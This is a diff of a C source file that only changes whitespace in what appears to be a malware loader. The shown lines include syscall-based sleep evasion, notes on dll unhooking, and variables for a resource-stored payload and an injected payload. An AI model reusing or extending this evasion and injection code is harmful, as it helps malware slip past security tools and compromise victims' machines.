@@ -13,15 +13,15 @@
 #pragma comment (lib, "shell32.lib")
 
 /*
-	NOTE:
-		* To enable debug mode, uncomment line 5 in the 'Debug.h' file.
-		* To delay execution before dll unhooking, uncomment line 9 in the 'Common.h' file
+NOTE:
+	* To enable debug mode, uncomment line 5 in the 'Debug.h' file.
+	* To delay execution before dll unhooking, uncomment line 9 in the 'Common.h' file
 */
 
 
 //------------------------------------------------------------------------------------------------------------
 NT_API		g_Nt				= { 0 };			// Found in Unhook.c and Inject.c as an 'extern' variable
-FLOAT		g_NT_DELAY_TIME		= 0.2;				// Delay execution for 0.2 minute
+FLOAT		g_NT_DELAY_TIME			= 0.2;				// Delay execution for 0.2 minute
 FLOAT		_fltused			= 0.0;				// Used for the compiler (this variable is located in the CRT library, thus its manually defined) 
 //------------------------------------------------------------------------------------------------------------
 
@@ -37,10 +37,10 @@ VOID AddWin32uToIat() {
 
 VOID DelayExecution(IN FLOAT fMinutes) {
 
-	NTSTATUS			STATUS			= 0x00;
-	DWORD				dwMilliSeconds	= fMinutes * 60000;					// Converting minutes to milliseconds  
-	LONGLONG            Delay			= dwMilliSeconds * 10000;			// Converting from milliseconds to the 100-nanosecond negative time interval
-	LARGE_INTEGER       DelayInterval	= { .QuadPart = (-1 * Delay) };
+	NTSTATUS		STATUS		= 0x00;
+	DWORD			dwMilliSeconds	= fMinutes * 60000;				// Converting minutes to milliseconds  
+	LONGLONG            	Delay		= dwMilliSeconds * 10000;			// Converting from milliseconds to the 100-nanosecond negative time interval
+	LARGE_INTEGER       	DelayInterval	= { .QuadPart = (-1 * Delay) };
 
 	SET_SYSCALL(g_Nt.NtDelayExecution);
 	if (!NT_SUCCESS(STATUS = RunSyscall(FALSE, &DelayInterval)) && STATUS != STATUS_TIMEOUT) {
@@ -55,7 +55,7 @@ int main() {
 
 
 	PBYTE	pRsrcPayloadBuffer	= NULL,
-			pInjectedPayload	= NULL;
+		pInjectedPayload	= NULL;
 	DWORD	dwRsrcPayloadSize	= 0x00;
 
 
